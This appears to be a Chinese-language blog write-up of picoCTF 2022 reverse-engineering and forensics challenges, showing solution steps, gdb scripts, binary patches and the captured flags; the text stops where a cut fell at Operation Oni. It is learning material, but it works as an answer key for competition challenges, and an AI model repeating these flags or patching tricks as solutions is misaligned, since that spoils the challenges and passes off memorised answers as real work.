---
layout: post
title:  "picoCTF 2022 writeUP"
date:   2022-04-01 08:15:31 +0800
math: true
categories: ctf
---
# picoCTF 2022 writeUP
~~大家好, 我是练习时长半年左右的业余计算机爱好者~~

啊, 虽然断断续续都半年了, 我还是不太擅长这些... 
picoCTF的比赛, 除了RE的赛道, 其他的所有的赛道我都没有全部做完. 
(给高中生的比赛都能把我按着锤... )

啊, 不管了, 我就装模作样地写一个writeUP吧, 就像我同学说的一样, 
请把这些当作是新时代网络小说看乐乐吧. 

(啊, 因为我忘了做题的顺序了, 所以我是按我计算机告诉我的
最后修改的时间来作为我记录的顺序. 所以难度不一定是递增的)

## RE
### file run 1 & 2
这两个可以说是真的水题, 只要会运行程序就可以得到输出了. 

呃, 虽然一开始的时候我也不会运行程序, 直到我明白了, 
*m1* 是一个稍微有点特别(坑)的东西, 也就是一个 *arm* 的架构. 
结果大部分的题目都是 *x86*, *x64* 的架构... 哼, 
我用虚拟机还不行吗? 

file_run1: 
```shell
> chmod +x run
> ./run
The flag is: picoCTF{U51N6_Y0Ur_F1r57_F113_47cf2b7b}
```

或者你觉得这样太麻烦了, 又要给文件增加可执行的权限`chmod`, 
又要运行程序, 这样总觉得是不是不太优雅? 

file_run2: 
```shell
> strings run | grep picoCTF
picoCTF{F1r57_4rgum3n7_f65ed63e}
```

这个的功能就是把放在程序中的字符串给提取出来(`string`), 
然后再用`grep`匹配一下, 假如有长得像是`flag`的东西就输出. 
这样的话, 是不是非常轻松了? 可惜问题是, 不是所有的程序
都会像这样直白的. 

### GDB Test Drive
呃, 题目的描述给了一个非常详细的描述, 基本上跟着做就完成了. 

> Here's the test drive instructions:
> * `$ chmod +x gdbme`
> * `$ gdb gdbme`
> * `(gdb) layout asm`
> * `(gdb) break *(main+99)
> * `(gdb) run`
> * `(gdb) jump *(main+104)

但是这样太水啦, 我们要讲道理, 这种无脑行为是没有什么意义的. 

所以用ghidra逆向查看, 发现函数里面有一个`sleep(100000);`的函数,
也就是说, 在运行程序的时候, 会需要等待一个超级变态无敌长的时间. 
所以用gdb跳过这个函数调用, 就能够不用等了. 

(那么假如有一个非常佛系的人, 还真的能等这么久的话, 是不是就可以
能够"通过"了? 我不知道, 我没有那种耐心. 但是如果我是出题人的话, 
我一定会设一个`alarm(99999)`的计时器, 然后到时间就把程序给关了. 
叫你等得花都谢了, 最后得到一个Time Out的退出. 是不是和百毒网盘
小水管下载了一周, 结果发现文件md5校验不通过, 下载的文件损坏了. 
这种心情一样? )

### patchme
观察代码, 发现里面就不过是个`if`条件判断: 

```python
if( user_pw == "ak98" + \
               "-=90" + \
               "adfjhgj321" + \
               "sleuth9000"):
    print("Welcome back... your flag, user:")
```

于是就直接知道要输入的东西了. 

但是毕竟代码都在我手上, 那么我不就可以瞎jb乱改了? 
直接把`if`语句给删掉了, 甚至连输入都可以不用输入啦. 
懒人的胜利. 耶. 

### Safe Opener
这个是一个Java的代码, 但是我不会Java(愚人节快乐! ). 
但是凭我的英语水平, 和对编程语言的自己的想法, 
**以及对搜索引擎查找文档的能力的掌握**. 

(不过我感觉Java的函数的命名实在是不敢恭维, 感觉这个命名
是在疯狂地重复强调作用对象, 就是让代码看起来非常长, 
这么长的东西看起来就很可怕. 比如: 
`encodedkey = encoder.encodeToString(key.getBytes());`, 
我觉得写成: 
`encodedkey = encoder.toString(key.toBytes())`
就会看起来统一一点... 并且也会好看(好懂)一点点. )

呃, 扯了一堆, 回到主题. 查看代码(我大概截取了重要的部分)

```java
System.out.print("Enter password for the safe: ");
key = keyboard.readLine();

encodedkey = encoder.encodeToString(key.getBytes());
System.out.println(encodedkey);

isOpen = openSafe(encodedkey);
if (!isOpen) {
  // 成功
}
```

主要的过程就是读取一个输入, 然后交给`openSafe`函数来判断, 
而这个判断的函数其实也不过就是一个`if`判断语句, 这个`if`函数, 
不过就是进行了一个Base64编码后的比较字符串而已. 

那么直接利用[cyberchef](https://gchq.github.io/CyberChef)这个工具, 
就可以轻松解码了. 

但是也可以直接用Ruby里面自带的库来实现: 

```irb
> require "base64"
> Base64.decode64("cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz")
 => "pl3as3_l3t_m3_1nt0_th3_saf3"
```

OK. 这就是flag了. 

### unpackme_py
这个感觉就像是给程序加壳的思想, 然后就会得到一个类似于源码加密的效果, 
但是, 毕竟我们现在手握(解密的)源码, 那岂不是挟天子以令诸侯, 
大喝一声, 你个小家伙, 给我在执行程序的时候把代码给我先输出来看. 

于是在`exec(plain.decode())`前把`plain.decode()`来打印出来就好. 

```python
pw = input('What\'s the password? ')

if pw == 'batteryhorse':
  print('picoCTF{175_chr157m45_85f5d0ac}')
else:
  print('That password is incorrect.')
```

这个就是打印出来的东西了. 

### Fresh Java
得到的一个`.class`文件, 到网上查找之后得知, 
这个类似是一个打包成二进制的类文件. 

那么直接用ghidra来打开, 发现里面不过也只是一堆`if`判断, 
虽然这个`if`为了增加复杂度, 是一个字符一个字符地比较的. 

靠人力来匹配感觉不是很友好, 所以我用Ruby进行了一个处理: 

```ruby
s = open("temp.txt").read
flag = []

s.gsub(/charAt\(([\d]+)\);\n\s+if \(cVar3 \!= \'(.)\'\)/) do |m|
  match = Regexp.last_match
  i = match[1].to_i
  chr = match[2]
  flag[i] = chr
end

print flag.join
# => picoCTF{700l1ng_r3qu1r3d_2bfe1a0d}
```

(感觉也不是很难嘛... )

### bloat
观察了代码, 发现这个代码的函数命名和参数的命名十分的无聊. 
简直就是烂代码的标准... 好吧, 其实就只是为了混淆代码, 
防止被逆向. 

不过我可以将这个代码来重新简化一下, 把那些叫做`arg432`的函数, 
把那些用字母表拼成的字符串`a[71]+a[64]+a[79]+a[79]+a[88]`给重新整理一下, 
最后就得到了: 

```python
def test_password(password):
  if password == "happychance":
    return True
  else:
    print("That password is incorrect")
    sys.exit(0)
    return False

def arg111(flag):
  return arg122(flag.decode(), "rapscallion")

def read_password():
  return input("Please enter correct password for flag: ")

# read encoded flag
def read_flag():
  return open('flag.txt.enc', 'rb').read()

def greet():
  print("Welcome back... your flag, user:")

def arg122(password, arg423):
    arg433 = arg423
    i = 0
    while len(arg433) < len(password):
        arg433 = arg433 + arg423[i]
        i = (i + 1) % len(arg423)        
    return "".join([chr(ord(arg422) ^ ord(arg442)) for (arg422,arg442) in zip(password,arg433)])

flag = read_flag()
password = read_password()
test_password(password)
greet()
arg423 = arg111(flag)
print(arg423)
sys.exit(0)
```

这样的话不就是轻轻松松了吗? 然后是不是就能够知道结果了? 

不, 我还是觉得太麻烦了. 所以我又看了看, 然后发现检测password
和解密flag是分开的, 所以把前面的检测代码注释掉, 最后就结束了. 

```shell
> python3 temp.py
Please enter correct password for flag: anything!!!!!!hahaha            
Welcome back... your flag, user:
picoCTF{d30bfu5c4710n_f7w_5e14b257}
```

### Bbbbloat
首先看了看是什么文件: 

```shell
> file bbbbloat
bbbbloat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=affb0d5630122ba0717a50d579952a83278e727c, for GNU/Linux 3.2.0, stripped
```

于是扔到虚拟机里面运行一下: 

```shell
> ./bbbb 
What's my favorite number? 666
Sorry, that's not it!
```

嗯... (我试过了`ltrace`和`strings`的尝试, 但都没有什么结果)
所以就麻烦一点用ghidra来解析一下.

然后发现里面的主函数`FUN_00101307`里面就像是一个类似于这样的代码: 

```ruby
def main
  str = "..." # 略去, 目测没什么用
  print "What's my favorite number? "
  number = gets.to_i
  if number == 549255
    # 然后应该是一个输出的函数, 但应该和我无关了
  else
    puts "Sorry, that's not it! "
  end
end
```

嗯, 所以结果显而易见. 就这样, 只要满足if表达式就可以了: 

```shell
> ./bbbb       
What's my favorite number? 549255
picoCTF{cu7_7h3_bl047_44f74a60}
```

### unpackme
文件名字提示了这个是一个UPX的壳, 于是脱壳: 

```shell
> upx -d unpackme
```

嗯. 然后去ghidra里面看看(我试过了strings了)

不是, 应该是先运行一下. 

```shell
> ./un  
What's my favorite number? 666
Sorry, that's not it!
```

怎么一股熟悉的味道... 

怎么说呢, 虽然这道题可以变得非常的难, 但是, 
怎么说呢, 和上一道题简直就是一毛一样啊??? 

难点在于这个程序将所有要用的函数库都打包在一起了, 
那么在成千上万的函数里面要找到主函数可能会比较麻烦一些. 

但是, 但是, 这个程序没有stripped啊!!! 我看一下函数表不就好了? 
然后检测输入的时候还就只是一个if, 诶. 

```C
  printf("What\'s my favorite number? ");
  __isoc99_scanf(&DAT_004b3020,&local_44);
  if (local_44 == 754635) {
    local_40 = (char *)rotate_encrypt(0,&local_38);
    fputs(local_40,(FILE *)stdout);
    putchar(10);
    free(local_40);
  }
  else {
    puts("Sorry, that\'s not it!");
  }
```

```shell
> ./un
What's my favorite number? 754635  
picoCTF{up><_m3_f7w_5769b54e}
```

### Keygenme
嗯, 这个任务的名字感觉妙妙的. 
(给人一种处理软件注册机的刺激感觉)
先运行试试. 

```shell
> ./key
Enter your license key: key
That key is invalid.
```

对主函数进行一个抄写: 

```ruby
# FUN_0010148b
def main
  print "Enter your license key: "
  get = (gets.strip)[0...25]
  # test() FUN_00101209
  if test(get)
    puts "The key is invaild."
  else
    puts "That key is vaild."
  end
end
```

不错, 只要解决`test`函数就好了. 

我发现最后还是一个if判断语句, 所以我觉得可以使用gdb动态调试它. 
只要搞清楚断点的位置. 

```ruby
require "gdb"

gdb = GDB::GDB.new "./key"
gdb.execute "b *0x0000555555555455"
gdb.execute "r <<< #{'a' * 36}"

36.times do
  temp = gdb.execute "print $al"
  print temp.match(/0x[0-9a-f]{2}/).to_s.to_i(16).chr
  gdb.execute "j *0x555555555460"
end

# => picoCTF{br1ng_y0ur_0wn_k3y_9d74d90d}
```

这个的想法就是我强制进行一个比较, 因为比较的时候, 
程序用来比较的字符是放在`al`里面的. 类似于这样: 

```ruby
input.each_char do |c|
  break if c != al
end
```

然后我的思路就是在比较前停一停, 然后把比较的东西`al`给读出来, 
然后输出这个字符, 跳到下一次比较过程中, 这样就可以历遍所有比较内容. 
于是就可以将结果输出了. 

### Wizardlike
总结一下就是, 同学, 买挂吗? 穿墙挂, 遁地挂, 随便选. 

(不是)

题目里面给了一个类似于地牢探险的游戏, 然后要在其中找到一些信息. 
呃, 看起来很有意思. 

扔到ghidra里面就可以看看程序的一些过程的思想. 里面的东西, 
大概就是一个判断输入, 左右移动, 关卡切换的代码. 

这样的话, 我就知道该怎么搞了. 想法就是把`if`语句给干了, 
和之前乱改代码的想法是一样的, 也就是把`js`或者`je`之类的代码给空了, 
于是就可以说, 好耶. 空要怎么空呢? 是直接删除吗? 非也, 
把那些命令换成`nop`命令就好了, 也就是`90 90`, 就可以让CPU
什么也不干, 就只是通过而已. 

#### 通关? 大概. 
只要把`00101f98`地址处的`75 11`换成`90 90`, 也就是把`if`语句给干了. 
然后就能一键过关, 太轻松了. 但是过关了啥也没有. 

(这次是`edit`)

#### 遁地穿墙挂
这一次我把移动的撞墙代码里面的if语句给干了. 
就是把`0010165b`地址处的`eb 0c`换成`90 90`, 然后就能够随便移动了. 

level 1: 
```
#########
#.......#  ......#...................................
#.......#  ...............@....####.#####.#####..###.
#........  .####.#..###..###..#.......#...# .....#...
#.......#  .#  #.#.#....#   #.#.......#...###...#....
#.......#  .####.#.#....#   #.#.......#...#......#...
#.......#  .#....#..###..###...####...#...#......###.
#.......#  .#........................................
#.......#  ..........................................
#.......#
#.......#
#.......#
#.......#
#.......#
#......>#
#########
```

level 2: 
```
#####.@.............................................................
#.<.#. ...............#..#.............##.......#..#........#.......
#...#. .#..#.###......#..#.......#...#..#.####..#..#.###....#.......
#...#. .#..#.#........####.......#.#.#..#...#...####.#...####.......
#...#. .####.#...####....#.#####..#.#..###.####....#.#...####.#####.
  .    .............................................................
  .    .............................................................
  .    .............................................................
#....
#...#
#...#
#...#
#...#
#...#
#.>.#
#####
```

level 3:
```
#################   .......
#<..............#.  .#...#.
#...............#.. .#...#.
#..............#.....#####.
#...#.......#...#.. .....#.
#..###.....###..#.  .....#.
#...#...#...#...#   .......
#......#>#......#   .......
#...............#        @
#...#.......#...#
#..###.....###..#
#...#.......#...#
#...............#
#...............#
#...............#
#################
```

level 4:
```
...             ..  .......
.<.          ####.  ..###..             
...          ...#.. .#...#.             
...          .@.#.....###..             
             ..>#.. .#...#.             
             ####.  ..###..             
                ..  .......             
                    .......
```

level 5: 
```
########################
#<.............#.......#
#..............#.#...#.#
#..............#.#...#.#
#..............#.#####.#
#..............#.....#.#
#..............#.....#.#           
#..............#.......#           
#..............#.......#           
########################           




            @


################         
#..............#
#..............#
#..............#
#..............#
#..............#
#..............#
#..............#
#.............>#
################
```

level 6: 
```
.......
.<.....
.......
.......
.......
.......
.......
.......
.......
..@....             
.......
.....>.             
.......             
#######             
.......             
.#...#.             
.#...#.
.#####.
.....#.
.....#.
.......
.......
```

level 7: 
```
...
.<.........
...........
...      ..
         ..
         ..
         ..
         ..
         ..
         ..
   ......@.......   
   ..##########..   
   .#          #.   
   .#  ....... #.
   .#  ..###.. #.
   .#  .#...#. #.
   .#  .#####. #.
   .#  .#...#. #.
   .#  .#...#. #.
   .#  ....... #.
   .#  ....... #.
   .#          #.
   ..##########..
   .............>
```

level 8:
```
#########################
#<#......#.#.......###..#
#.#.###..#.#.......##..##
#.#.#.#..#.#.......#..###
#.#.#.#..#.#.......#...##
#...#....#..#......#....#
#.######.##..###.###....#
#.#.....................#
#.###.#################.#
#.......................#
#########.###.#########.#  
#.......#.#.#.#.........#  
#.####..#.#...#.#########  
#.#...#.#.#.#.#.........#  
#.#...@.#.#.#.#########.#  
#.#...#.#.#.#.#.........#  
#.####..#.#.#.#.#########  
#.......#.#.#.#.........#  
#.......#.#.#.#########.#  
#########. .#.#...#...#.#  
#...........#.#.#.#.#.#.#  
######## . .#.#.#.#.#.#.#  
#.......#...#.#.#.#.#.#.#  
####.### ...#.#.#.#.#.#.#  
##..........#.#.#.#.#.#.#  
#.#..####...#.#.#.#.#.#.#  
#..#....#####.#.#.#.#.#.#  
#...#...#...#.#.#...#...#  
#....#........#.#########  
#...........#.#........>#   
########################.
```

level 9(这个比较坑, 因为一开始屏幕不够宽, 所以没有看到)
```
...                                                                                          .......
.<.                                                                                          ...#...
...                                                                                          ..#...@
...                                                                                          .####..
                                                                                             .#...#.
                                                                                             ..###..
                                                                                             .......
                                                                                             .......
```

level 10: (这个也很坑, 上面的是一堆东西, 下面也是一堆东西, 
中间的全部都是空白填充, 鬼知道是什么东西. 总之就是非常坑)
```
                                                                                    ################
                                                                                 ####..............#
                                                                                 ####.#####.###....#
                                                                                 ####.#.......#....#
                                                                                 ####.###.....@#...#
                                                                                 ####.#.......#....#
                                                                                 ####.#.....###....#
                                                                                 ####..............#
                                                                                    #..............#
                                                                                    ################
```

目前猜出的就只有这些, 但是我错了, 不对啊. 
`picoCTF{ur_4_wlz4rd_4844AD6F}`

可恶. 

(这一次的是`edit2`)

#### 啊, 眼神问题
`picoCTF{ur_4_w1z4rd_4844AD6F}`

好了. 解决问题. 就这也能叫Wizardlike? 嘿嘿嘿, 
有谁记得攻壳机动队里面少佐(还是笑面男? )是超Wizard级的黑客. 

## Forensics
### Enhance!
这道题得到的是一个svg图片, 可惜我对这种东西不是很会啊. 

好吧. 一开始我做的时候没注意, 只看见了一个大大的圆盘, 
现在重新看的时候发现里面竟然还有一些小小的文字... 妙啊. 

那还是介绍我原来的思路吧: 就是我在svg代码里面发现了一堆的文字, 
然后把那些文字给拼起来. 现在想想, 好粗暴啊... 

> 坦白来说不太会, 但是蒙呗. 
> 看到文件里面有一些奇怪的字眼和像是flag的问题, 
> 合起来试试: 
> `picoCTF{3nh4nc3d_d0a757bf}`
> 
> 不出意外的成功了. 

### File types
这个问题怎么说呢, 是一个考验耐心的问题吧? 也许我的方法太差了, 
可能有更好的方法来解决这个问题. 

题目给了一个`Flag.pdf`

```shell
> file Flag.pdf
Flag.pdf: shell archive text
```

哼, 这个东西肯定是乱改文件后缀名让文件无法被正确识别而已.
也就是一个`shell`脚本啦. 扔到虚拟机里面运行, 得到了一个flag文件. 
太怪了, 这个是一个压缩文件... 

```shell
> file flag
flag: current ar archive
```

不理解. 去[网上](https://en.wikipedia.org/wiki/Ar_(Unix))找, 
然后发现了一个`ar`命令, 然后在`man`里面看看: 

```text
NAME
     ar – create and maintain library archives

SYNOPSIS
     ar -d [-TLsv] archive file ...
     ar -m [-TLsv] archive file ...
     ar -m [-abiTLsv] position archive file ...
     ar -p [-TLsv] archive [file ...]
     ar -q [-cTLsv] archive file ...
     ar -r [-cuTLsv] archive file ...
     ar -r [-abciuTLsv] position archive file ...
     ar -t [-TLsv] archive [file ...]
     ar -x [-ouTLsv] archive [file ...]
```

嗯, 然后就照猫画虎: 

```shell
> ar -x flag
```

嗯, 然后得到了新的flag文件, 结果出现的不是flag内容, 
而是一个新的... 

```shell
> file flag
flag: cpio archive
```

嗯, 可恶. 再来[查找](https://en.wikipedia.org/wiki/Cpio), 
然后是`man`里面的帮助文档: 

```shell
NAME
     cpio – copy files to and from archives

SYNOPSIS
     cpio -i [options] [pattern ...] [< archive]
     cpio -o [options] < name-list [> archive]
     cpio -p [options] dest-dir < name-list
```

维基百科上的例子: 

```shell
> cpio -i -d /etc/fstab < archive.cpio
```

于是照猫画虎. 虽然过程中出现了一个小小的尴尬, 因为这个flag
文件和里面的压缩的文件重名了, 所以要把它重命名了: 
```shell
> file flag 
flag: cpio archive
> cpio -i < flag   
cpio: flag not created: newer or same age version exists
2 blocks
> mv flag archive
> cpio -i < archive 
2 blocks
> ls
archive  flag
> file flag
flag: bzip2 compressed data, block size = 900k
```

我: ?????? 还是压缩包, 这是要压缩几层才能罢休呢? 

```text
NAME
       bzip2, bunzip2 - a block-sorting file compressor, v1.0.8
       bzcat - decompresses files to stdout
       bzip2recover - recovers data from damaged bzip2 files

SYNOPSIS
       bzip2 [ -cdfkqstvzVL123456789 ] [ filenames ...  ]
       bunzip2 [ -fkvsVL ] [ filenames ...  ]
       bzcat [ -s ] [ filenames ...  ]
       bzip2recover filename

```

然后最后在[网上](https://www.thomas-krenn.com/en/wiki/Archive_under_Linux_(tar,_gz,_bz2,_zip)#bz2.2C_bzw._bzip2)得到解压的方法, 就直接看操作吧: 

```shell
> bunzip2 flag
bunzip2: Can't guess original name for flag -- using flag.out
```

坏了, 还想着秀操作的来着. 

```text
       If the file does not end in one of the recognised endings, .bz2, .bz,
       .tbz2 or .tbz, bzip2 complains that it cannot guess the name of the
       original file, and uses the original name with .out appended.
```

呃, 好吧. 不管怎样, 有一个东西输出了就好了: 

```shell
> ls
archive  flag.out
> file flag.out 
flag.out: gzip compressed data, was "flag", last modified: Tue Mar 15 06:50:41 2022, from Unix, original size modulo 2^32 326
```

该死, 那么应该再接触一下gzip的格式. (不过前面的网站里面有介绍了, 
直接上)

```shell
> mv flag.out flag.gz
> gunzip flag.gz
> ls -1
archive
flag
> file flag   
flag: lzip compressed data, version: 1
```

要耐心... 

```shell
> lzip -d flag 
> ls
archive flag.out
> file flag
flag.out: LZ4 compressed data (v1.4+)
```

man的介绍: 

```text
NAME
       lz4 - lz4, unlz4, lz4cat - Compress or decompress .lz4 files

SYNOPSIS
       lz4 [OPTIONS] [-|INPUT-FILE] OUTPUT-FILE

       unlz4 is equivalent to lz4 -d
```

```shell
> lz4 -d flag.out flag
flag.out             : decoded 263 bytes   
> ls                  
archive  flag  flag.out
> file flag    
flag: LZMA compressed data, non-streamed, size 253
> mv flag flag.lzma
> lzma -d flag.lzma
> ls               
archive  flag  flag.out
> file flag
flag: lzop compressed data - version 1.040, LZO1X-1, os: Unix
> mv flag flag.lzo
> lzop -d flag.lzo
> ls              
archive  flag  flag.lzo  flag.out
> file flag
flag: lzip compressed data, version: 1
> rm flag.out
> lzip -d flag
> file flag.out 
flag.out: XZ compressed data
> mv flag.out flag.xz
> unxz flag.xz
> ls          
archive  flag  flag.lzo
> file flag   
flag: ASCII text
> cat flag
7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f
6630725f3062326375723137795f39353063346665657d0a
```

这是什么? 猜测是ascii码的十六进制表示. 好的. 

```ruby
s = "7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f"\
    "6630725f3062326375723137795f39353063346665657d0a"
i = 0
while i < s.length
  print s[i..(i+1)].to_i(16).chr
  i += 2
end
# => picoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_950c4fee}
```

终于啊.

总而言之, 这个题目不难, 但是很麻烦. (估计这就是为什么在平台上, 
这个题的好评度超级低... )做到后面之后完全没有耐心了. 

不过好处是让我知道了很多的压缩格式以及对应的处理方法. 
也算是学习到好东西了. 有意思. 

### Lookey here
题目的描述里面就已经给了很多的提示了: 

> Attackers have hidden information in a very large mass
> of data in the past, maybe they are still doing it.

所以一行命令解决: 

```shell
> cat anthem.flag.txt|grep pico
      we think that the men of picoCTF{gr3p_15_@w3s0m3_2116b979}
```

或者用Ruby来: 

```ruby
File.open("anthem.flag.txt", "r").read.match(/picoCTF\{.+\}/)
# => #<MatchData "picoCTF{gr3p_15_@w3s0m3_2116b979}">
```

### Packets Primer
就是网页数据包的捕获的一个分析. 

首先介绍一下这个分析软件: 
[wireshark](https://www.wireshark.org), 
这个软件的作用就是分析数据包, 比如说你在网上冲浪的时候, 
你的电脑会和服务器之间相互传递信息, 这些信息是以数据包的
形式来传递的. 假如我们在中间截取(窃听)了通信, 就可以得到
你们沟通的数据包. 然后通过分析你的数据包, 我们没准就可以
知道你在访问什么不得了的网站或者发送(下载)不得了的信息. 

原理是这样, 操作上不太会. 因为之前都没有用过, 并且, 
据说这种东西本来应该是用filter来做才能够发挥功能的, 
但是我做的时候都是人眼filter的. 太low了. 

虽然但是, 这道问题里面的操作实在是太简单了. 
打开软件, 读取文件内容, 然后随便看看每一个数据包, 结果, 
假如眼尖的话, 就看见了:

![screenshoot]({{ site.github.url }}/_img/picoctf2022/packets_primer.png "see?")

The answer is blowing in the wind. 

### Redaction gone wrong
就是一个类似于SCP文件的pdf文件, 但是实际上原理就跟Photoshop
里面图层遮盖的想法是一样的, 所以用Photoshop, (或者类似的, 
GIMP也行)打开, 然后把黑色矩形的去掉就好了. 

(后来想想, 还是直接在文字图层里面复制比较好, 手打的话, 
会打错... )

### Sleuthkit Intro & Apprentice
类似一套题目, 先是一个教学关卡, 然后再是一个稍微升级一点的小怪. 
所以我就上下段连着介绍了. 

首先解压开下载的文件: 

```shell
> gunzip disk.img.gz
> ls
disk.img
> file disk.img 
disk.img: DOS/MBR boot sector; partition 1 : ID=0x83, active, start-CHS (0x0,32,33), end-CHS (0xc,190,50), startsector 2048, 202752 sectors
```

完全不会啊, 我的天. 

然后查看了Hints: 让我使用`mmls`来解决. 查找之后才知道这个是来自
`sleuthkit`软件包的工具, 哇, 和题目名字一毛一样诶. 好的, 有提示了. 

安装软件包的方法, 在mac上面直接用homebrew就好了, 或者linux上, 
用相应的包管理器就好了. 我觉得没啥问题. 

Intro的题目非常的简单, 类似于打开计算机的难度, 就是问问你磁盘的大小. 
用`mmls`命令就可以解决问题啦. 

```shell
> mmls disk.img
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000204799   0000202752   Linux (0x83)
```

好吧, 好吧, 回去看了一眼题目, 没想到它真的不难, 
问题是如何得到Linux的分区的大小, 然后, 小学数学题了属于是, 
End - Start + 1 = 202752. 

```shell
> nc saturn.picoctf.net 52279
What is the size of the Linux partition in the given disk image?
Length in sectors: 202752
202752
Great work!
picoCTF{mm15_f7w!}
```

解释一下, 在man里面的mmls的说明是这样的: 

> mmls - Display the partition layout of a volume system

也就是说, 它可以列出磁盘结构. 哇唔. 妙啊. 
(其实我后来知道, 这个是需要提前检查的, 这个在后面的Appreciate里面, 
我重新去网上看了一段介绍的影片, 真的是, 感觉相关的介绍比较少? 
可能是因为我的打开方式不太对. )

下面是针对skleuthkit的一般操作方式: 

首先是检查disk文件的磁盘类型: 

```shell
> img_stat disk.flag.img
IMAGE FILE INFORMATION
--------------------------------------------
Image Type: raw

Size in bytes: 314572800
Sector size:	512
```

`img_stat`的命令可以将磁盘镜像的一些基本信息输出出来. 
在上面的`Image Type`就说明是一种`raw`, 据视频介绍, 
对于这种类型的磁盘, 可以使用`mmls`来直接看看这个文件. 
并且需要使用`offset`来读取上面的数据, 
而对于`logical`类型的, 好像就用不着`offset`了. 
(不过我不是很懂, 因为没有遇见过. )

然后使用`mmls`可以得到磁盘里面的文件结构. 类似于, 呃, 
想想一堆数据, 这堆数据里面的数据可能是以不同的方式组织的, 
比如常见的`ext4`, `fat32`之类的. 

虽然在以前我还是很热衷于给我的老电脑分盘, 
因为对于机械硬盘的C, D盘, 它们有点区分还是有点用的. 
(但是换上坑爹小小小小小SSD的水果之后, 我就没什么想法了, 
小小一个苹果, 被坑爹的资本家咬了辣么大一口, 剩下的还能怎么分呢? )

例子: 
```shell
> mmls disk.flag.img
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000206847   0000204800   Linux (0x83)
003:  000:001   0000206848   0000360447   0000153600   Linux Swap / Solaris x86 (0x82)
004:  000:002   0000360448   0000614399   0000253952   Linux (0x83)
```

上面的东西就是一个简单的例子: 上面的可以看到, `Description`
里面介绍了类似于分区的一个分区的类型. 而`Start`, `End`等
就是一个磁盘分区相对于磁盘的开始的一个`offset`的位移量. 
之前说过了, 对于`raw`类型的, 是利用这些位移量来访问数据的. 

为了更加确定文件的类型, 可以用`fsstat`来检查: 

```shell
> fsstat -o 2048 disk.flag.img
FILE SYSTEM INFORMATION
--------------------------------------------
File System Type: Ext4
Volume Name: 
Volume ID: 8e023955b4e7dab7e04b7643076ccf0f

Last Written at: 2021-09-30 02:10:02 (CST)
Last Checked at: 2021-09-29 23:57:16 (CST)

Last Mounted at: 2021-09-30 02:06:00 (CST)
Unmounted properly
Last mounted on: /mnt/boot

Source OS: Linux
Dynamic Structure
Compat Features: Journal, Ext Attributes, Resize Inode, Dir Index
InCompat Features: Filetype, Extents, Flexible Block Groups, 
Read Only Compat Features: Sparse Super, Large File, Huge File, Extra Inode Size

Journal ID: 00
Journal Inode: 8

METADATA INFORMATION
--------------------------------------------
...
```

嗯, 大概就是这样. 可以看见里面的`File System Type`之类的类型, 
就是文件系统的类型. 这里是`ext4`, 为什么一定要确认呢? 
这是为了让之后的操作里面, 哪怕是出现了一些不能够自动识别的情况, 
那么就可以通过人为强行指定文件类型的方式来满足操作. 

(其实上面的做法是没什么必要的, 写了那么多之后我觉得好无聊啊, 
并且我也觉得没什么鸟用, 里面没写什么高级的东西, 所以我, 
怎么说呢, 本来打算删掉, 但是都码了这么多字了, 删掉有点可惜... )

(废话太多啦!!!! )

接下去一定更加实际一点. `fls`和`icat`命令估计就是我最常用的东西了, 
这两个命令的功能和`ls`以及`cat`是十分对应的. 具体的用法也差不多: 
都是: **命令 -o 磁盘的开始offset 磁盘文件 [磁盘文件上的位移]**. 

比如: 

```shell
> fls -o 2048 disk.flag.img
d/d 11:	lost+found
r/r 12:	ldlinux.sys
r/r 13:	ldlinux.c32
r/r 15:	config-virt
r/r 16:	vmlinuz-virt
r/r 17:	initramfs-virt
l/l 18:	boot
r/r 20:	libutil.c32
r/r 19:	extlinux.conf
r/r 21:	libcom32.c32
r/r 22:	mboot.c32
r/r 23:	menu.c32
r/r 14:	System.map-virt
r/r 24:	vesamenu.c32
V/V 25585:	$OrphanFiles
```

这样就相当于列出了linux根目录上面的文件夹内容. 
现在看到的文件内容不是很熟悉, 因为这个不是我想要找的分区, 
所以换一个分区, 然后可以看到: 

```shell
> fls -o 360448 disk.flag.img
d/d 451:	home
d/d 11:	lost+found
d/d 12:	boot
d/d 1985:	etc
d/d 1986:	proc
d/d 1987:	dev
d/d 1988:	tmp
d/d 1989:	lib
d/d 1990:	var
d/d 3969:	usr
d/d 3970:	bin
d/d 1991:	sbin
d/d 1992:	media
d/d 1993:	mnt
d/d 1994:	opt
d/d 1995:	root
d/d 1996:	run
d/d 1997:	srv
d/d 1998:	sys
d/d 2358:	swap
V/V 31745:	$OrphanFiles
```

随便逛逛, 比如说去看看root文件夹里面的东西, 
因为root文件夹相对当前的磁盘开始位置的位移是`1995`, 
正如你所看见的. 所以加上位移, 我们就能访问文件啦: 

```shell
> fls -o 360448 disk.flag.img 1995
r/r 2363:	.ash_history
d/d 3981:	my_folder
```

呃, 一个有意思的文件夹. 
(注: 如何知道里面显示的东西是啥呢, 其实很简单, 
前面有一个标注: `r/r`表示是可以读的文件, 
`d/d`表示是文件夹, 然后一些带星号的是被删除的文件. )

(当时我没有一个看历史文件的想法, 但是看看历史文件
`.ash_history`可以知道用户在这个终端里面干了什么的. )

直接打开`my_folder`, 发现里面有一个叫做`flag.txt`的东西, 
那么用`icat`输出就可以看到内容了: 

```shell
> fls -o 360448 disk.flag.img 3981
r/r * 2082(realloc):	flag.txt
r/r 2371:	flag.uni.txt
> icat -o 360448 disk.flag.img 2371
picoCTF{by73_5urf3r_2f22df38}
```

注: 这样的工作有什么意义呢? 比如说有一个人通过`dd`命令备份了你的硬盘, 
然后通过这样的方式来就可以分析你的硬盘里面有什么数据. 
好像这样的技术就叫做取证技术. 

### Operation Oni
嘿, 前面的技术刚好可以使用了. 这次的题目要求我们从磁盘中提取出
ssh的key file, 然后连接到服务器上得到flag. 

稍微介绍一下, 这个key file顾名思义, 就是一种类似于密码的东西, 
